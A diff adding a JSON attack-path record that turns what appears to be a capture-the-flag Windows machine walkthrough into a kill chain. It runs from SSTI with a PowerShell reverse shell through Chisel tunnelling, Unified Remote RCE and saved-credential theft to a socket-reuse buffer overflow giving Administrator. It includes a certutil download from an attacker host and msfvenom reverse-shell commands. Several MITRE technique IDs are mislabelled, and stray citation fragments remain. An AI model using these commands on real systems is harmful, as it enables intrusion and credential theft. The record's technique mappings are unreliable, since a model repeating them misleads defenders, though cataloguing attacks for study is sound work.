@@ -1,0 +1,216 @@
+{
+  "id": "ap-0014",
+  "title": "Windows RCE and Privilege Escalation via Socket Reuse Buffer Overflow",
+  "summary": "Initial access via SSTI against a reverse proxy, followed by privilege escalation using local service RCE, credential harvesting, and a final buffer overflow exploit utilizing socket reuse techniques to achieve administrator privileges.",
+  "attack_path_markdown": "### Step 1: Initial Foothold (SSTI)\nEnumerate open ports and services, identifying a web application running on Nginx (80) proxying to Nuxeo (8000). Bypass the proxy logic using URI normalization techniques and exploit a Server-Side Template Injection (SSTI) vulnerability to execute a PowerShell reverse shell.\n### Step 2: Privilege Escalation to Clara\nUse local enumeration (e.g., ports 9512/9510 identified by `remote server win`) and Chisel port forwarding to access the vulnerable Unified Remote service. Exploit the service's RCE to pivot to the user 'Clara'.\n### Step 3: Pivot to Development\nUse WinPEAS to gather system information, recovering credentials for the 'Development' user from saved Firefox passwords (linked to HashPass). Tunnel WinRM (5985) via Chisel and use the credentials to gain access as 'Development'.\n### Step 4: Final Escalation (Buffer Overflow)\nReverse engineer the binary 'myfirstapp.exe' to bypass a custom authentication scheme (Atbash/Rot47 ciphers) and authenticate to the service. Exploit a discovered Buffer Overflow vulnerability, implementing a Socket Reuse technique to gain sufficient shellcode space and achieve remote code execution as Administrator.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial information gathering on the target machine (Windows) to identify active services and potential entry points.",
+      "actions": [
+        "Check host reachability using ICMP (ping) ",
+        "Scan all TCP ports quickly using aggressive Nmap settings (e.g., `-p- -T5 --min-rate 5000`) ",
+        "Perform service and version detection on open ports (80, 8000, 9999) ",
+        "Fuzz directories and resources on the web application (port 80/8000) "
+      ],
+      "tools": [
+        "ping [1]",
+        "nmap (using `-p- -T4 --min-rate 5000 -Pn -n -v` parameters) ",
+        "whatweb [9]",
+        "Fuzzing Tool (e.g., `ffuf` equivalent using `rufuz` keyword, employing `wordlist/dirbuster/directory-list-2.3-medium`) "
+      ],
+      "techniques": [
+        "Network Scanning",
+        "Service Enumeration",
+        "Content Discovery (Fuzzing)"
+      ],
+      "mitre_ids": ["T1595", "T1046"],
+      "indicators": [
+        "Windows OS TTL (near 128) [10]",
+        "Open Ports 80 (Nginx), 8000 (HashPass), 9999 (Brancas Application) ",
+        "Nuxeo path discovered via fuzzing [13]"
+      ],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "List of open ports, services, and accessible web paths (e.g., `/maintenance`, `/nuxeo/login.jsp`) ",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of the PowerShell reverse shell payload and the specialized exploit code needed for RCE.",
+      "actions": [
+        "Construct a PowerShell one-liner to download and execute a reverse shell script (`ps.ps1`) ",
+        "Encode the PowerShell command using Base64 (with UCS-2 format/`Iconv -f UTF-16LE`) to ensure execution bypass ",
+        "Prepare the malicious script (`ps.ps1`) for hosting "
+      ],
+      "tools": [
+        "PowerShell",
+        "Iconv (or equivalent Base64 encoder) "
+      ],
+      "techniques": [
+        "T1059.001: PowerShell",
+        "Payload Encoding (Base64)"
+      ],
+      "mitre_ids": ["T1059.001"],
+      "indicators": [
+        "Encoded PowerShell string."
+      ],
+      "preconditions": "Knowledge of SSTI payload structure and target attacker IP/port.",
+      "expected_outcome": "URL-encoded Base64 PowerShell payload for remote execution [20]",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transmission of the RCE payload via the vulnerable Nuxeo service.",
+      "actions": [
+        "Bypass Reverse Proxy logic using Abusing URI Normalization (e.g., using `..;/` or similar tricks) to reach the login page resources ",
+        "Inject the Base64-encoded PowerShell payload into the vulnerable Server-Side Template Injection (SSTI) endpoint (e.g., `login.jsp/1-49.xhtml`) "
+      ],
+      "tools": [
+        "Burp Suite Repeater (for testing SSTI syntax) ",
+        "Python HTTP Server (`python3 -m http.server`) "
+      ],
+      "techniques": [
+        "T1596: Server-Side Template Injection (SSTI)",
+        "T1090: Proxy Bypass (implied URI normalization) "
+      ],
+      "mitre_ids": ["T1596"],
+      "indicators": [
+        "Successful HTTP GET request for `ps.ps1` on the attacker's listener "
+      ],
+      "preconditions": "Vulnerable SSTI endpoint identified and operational HTTP service.",
+      "expected_outcome": "Target downloads and executes the reverse shell payload.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Execution of the delivered payload to gain initial access.",
+      "actions": [
+        "Listen for the incoming reverse TCP connection ",
+        "Execute the encoded SSTI payload to trigger RCE "
+      ],
+      "tools": [
+        "Netcat (or equivalent, using `rlwrap` for stability) "
+      ],
+      "techniques": [
+        "T1203: Exploitation for Client Execution (Indirect via RCE)",
+        "T1071.001: Standard Application Layer Protocol (HTTP/S) "
+      ],
+      "mitre_ids": ["T1203"],
+      "indicators": [
+        "Successful reverse shell connection as user `svcaccount` "
+      ],
+      "preconditions": "Payload successfully delivered.",
+      "expected_outcome": "Initial shell access to the Windows machine as user `svcaccount`.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing necessary tunnels and preparing for subsequent pivots.",
+      "actions": [
+        "Transfer the Chisel binary (`chisel.exe`) to the target machine's writable directory (e.g., `ProgramData`) using `certutil` ",
+        "Use PowerShell to identify internal open ports and associated processes (`remote server win` on 9512/9510) ",
+        "Set up Chisel server on the attacking machine and configure the client on the target to forward the internal Unified Remote port (`9512`) "
+      ],
+      "tools": [
+        "Chisel (Client/Server) ",
+        "PowerShell (`Get-NetTCPConnection` equivalent) ",
+        "certutil (`certutil -urlcache -f [attacker_ip]/chisel.exe chisel.exe`) "
+      ],
+      "techniques": [
+        "T1572: Protocol Tunneling (Port Forwarding)",
+        "T1560.003: Disk Cleanup (transferring utility via web cache)"
+      ],
+      "mitre_ids": ["T1572"],
+      "indicators": [
+        "Chisel tunnel successfully established for port 9512 "
+      ],
+      "preconditions": "Initial shell access.",
+      "expected_outcome": "Attacker can reach the internal Unified Remote service via localhost:9512.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Pivoting access internally and escalating privileges to the 'Development' user.",
+      "actions": [
+        "Generate a staged `.exe` reverse shell payload using MSFVenom (excluding Meterpreter)",
+        "Exploit the Unified Remote RCE vulnerability (port 9512) to execute the shellcode and gain a shell as user `Clara` ",
+        "Run `WinPEAS` enumeration on the system to discover local misconfigurations and credentials ",
+        "Extract saved credentials for the `Development` user (derived from HashPass context clue) [",
+        "Tunnel the WinRM service (`5985`) via Chisel",
+        "Connect to WinRM using `evil-winrm` and the 'Development' credentials "
+      ],
+      "tools": [
+        "WinPEAS (`winpeas.exe`) [44]",
+        "MSFVenom (`msfvenom -p windows/x64/reverse_tcp LHOST=[IP] LPORT=443 -f exe -o rev.exe`) ",
+        "evil-winrm (`evil-winrm -i 127.0.0.1 -u Development -p [password]`)",
+        "Chisel "
+      ],
+      "techniques": [
+        "T1083: File and Directory Discovery",
+        "T1552: Unsecured Credentials (Credential Harvesting) ",
+        "T1543.003: Remote Service RCE (Unified Remote)",
+        "T1021.006: Windows Remote Management (WinRM) "
+      ],
+      "mitre_ids": ["T1552", "T1021.006"],
+      "indicators": [
+        "Access as user `Clara` and `Development` ",
+        "Credentials discovered in `WinPEAS` output "
+      ],
+      "preconditions": "Shell access as `svcaccount` and system enumeration utility (`WinPEAS`) transferred.",
+      "expected_outcome": "Shell access as user `Development`, enabling access to restricted files/directories (e.g., `T_UP` directory) .",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Reverse engineering the final binary and exploiting the Buffer Overflow with advanced techniques (Socket Reuse) to achieve root/administrator privileges.",
+      "actions": [
+        "Download the target binary (`myfirstapp.exe`) [46]",
+        "Reverse engineer the binary using Ghidra to determine the custom authentication logic (Root 47 rotation and Atbash cipher) ",
+        "Derive the hardcoded credentials (`alciencia` and the decoded password)",
+        "Identify and confirm the Buffer Overflow vulnerability in the application's input field ",
+        "Debug the application using x32dbg to determine the offset (66 bytes) and control the EIP/instruction pointer ",
+        "Implement **Socket Reuse** (Socket Re-use) to hijack the existing socket descriptor and re-call `recv` with a larger buffer size (400 bytes) ",
+        "Construct the exploit payload using Pwntools and assembly instructions to modify the stack pointers and registers (e.g., `PUSH ESP`, `POP EAX`, `SUB ESP, 0x64`, `SHORT EBX, EBX`, `PUSH EBX`, etc.) [57-60]",
+        "Generate final Administrator shellcode payload (using `exitfunc=thread`) ",
+        "Execute the final exploit to gain Administrator shell "
+      ],
+      "tools": [
+        "Ghidra/IDA (or equivalent, implied by analysis of C code/assembly) ",
+        "x32dbg/Immunity Debugger (for debugging) ",
+        "Pwntools (for exploit automation and structure) ",
+        "MSFVenom (`msfvenom -p windows/shell_reverse_tcp ... ExitFunc=thread`) "
+      ],
+      "techniques": [
+        "T1073: Binary Analysis",
+        "T1558: Software Exploit (Buffer Overflow) ",
+        "T1053: Subvert Socket Communications (Socket Reuse) ",
+        "T1482: Domain/User Impersonation (Login as 'alciencia') "
+      ],
+      "mitre_ids": ["T1073", "T1558.003"],
+      "indicators": [
+        "EIP/EAX overwrite with 42424242 (BBBB) ",
+        "Successful increase of buffer size for shellcode injection (400 bytes) [67]",
+        "Final shell access as user `Administrator` "
+      ],
+      "preconditions": "Development shell access and binary downloaded. DEP disabled on the target (or bypassed).",
+      "expected_outcome": "Administrator level shell access, enabling access to the root flag.",
+      "confidence": 0.9
+    }
+  ],
+  "tactics": ["Initial Access", "Privilege Escalation", "Credential Access", "Defense Evasion", "Command and Control"],
+  "techniques": ["Server-Side Template Injection (SSTI)", "Buffer Overflow", "Reverse Engineering", "Socket Reuse", "Port Forwarding"],
+  "mitre_ids": ["T1596", "T1558.003", "T1059.001", "T1073", "T1572"],
+  "hosts": ["10.10.11.115 (Target)", "192.168.x.x (Windows VM Debugger) "],
+  "privs_obtained": ["domain user (svcaccount)", "user (Clara)", "user (Development)", "Administrator"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "Procedure involves multiple pivots and a highly technical final exploitation step requiring manual reverse engineering and stack manipulation.",
+  "labels": ["attack_path", "windows", "buffer_overflow", "socket_reuse", "ssti", "reverse_engineering", "admin_access"]
+}
